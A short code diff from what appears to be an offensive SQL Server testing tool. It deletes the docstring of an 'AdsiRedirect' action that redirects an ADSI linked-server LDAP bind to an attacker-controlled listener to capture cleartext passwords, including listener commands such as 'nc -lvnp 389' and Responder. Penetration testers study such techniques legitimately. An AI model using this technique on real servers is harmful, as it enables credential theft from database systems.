@@ -16,27 +16,6 @@ from ...services.adsi import AdsiService
     "Redirect an ADSI linked server LDAP query to an attacker-controlled listener to capture cleartext credentials. No privileges required.",
 )
 class AdsiRedirect(BaseAction):
-    """
-    Redirect an ADSI linked server LDAP query to an attacker-controlled host.
-
-    SQL Server performs an LDAP simple bind to the redirected address, leaking
-    the configured linked login's cleartext password (or the current SQL context
-    password when the server uses useself=TRUE).
-
-    No elevated privileges required — only OPENQUERY access to an existing ADSI
-    linked server.  Works from a SQL injection context.
-
-    Capture the bind with:
-        sudo responder -I eth0 --lm
-        nc -lvnp 389
-        Wireshark filter: ldap
-
-    If the ADSI server uses useself=TRUE (no explicit linked login), the bind
-    uses the current SQL context's password — useful when landing as an unknown
-    SQL login via a linked server chain.
-
-    Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords
-    """
 
     _listener_address = Arg(position=0, required=True, description="Listener IP[:port] for LDAP capture")
     _target_server = Arg(position=1, default="", description="ADSI server name to redirect")
